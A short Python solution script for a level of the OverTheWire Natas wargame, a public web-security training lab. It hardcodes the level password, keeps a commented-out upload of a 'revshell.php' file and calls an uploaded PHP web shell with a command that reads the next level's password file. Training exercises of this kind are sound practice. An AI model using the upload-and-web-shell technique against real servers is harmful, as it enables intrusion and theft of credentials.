import requests

user_name = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

url = f"http://{user_name}.natas.labs.overthewire.org"

session = requests.Session()


#response = session.get(url, auth = (user_name, password))
# response = session.post(url, data = {"filename" : "revshell.php", "MAX_FILE_SIZE" : "1000"},
#                        auth =  (user_name, password), files = {"uploadedfile" : open("revshell.php", "rb")})

response = session.get(url + "/upload/bnzukipvtz.php?c=cat /etc/natas_webpass/natas13", auth = (user_name, password))

content = response.text


print(content)